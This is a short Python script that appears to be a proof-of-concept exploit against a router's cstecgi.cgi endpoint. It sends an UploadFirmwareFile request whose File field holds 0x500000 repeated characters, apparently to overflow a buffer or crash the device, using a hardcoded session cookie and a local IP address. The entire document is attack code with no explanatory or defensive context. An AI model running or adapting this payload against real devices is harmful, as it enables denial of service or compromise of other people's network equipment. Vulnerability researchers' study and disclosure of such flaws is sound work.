import requests
url = "http://192.168.210.133:8080/cgi-bin/cstecgi.cgi"
cookie = {"Cookie":"SESSION_ID=2:1721039211:2"}
data = {'topicurl' : "UploadFirmwareFile",
"File" : "a"*0x500000}
response = requests.post(url, cookies=cookie, json=data)
print(response.text)
print(response)
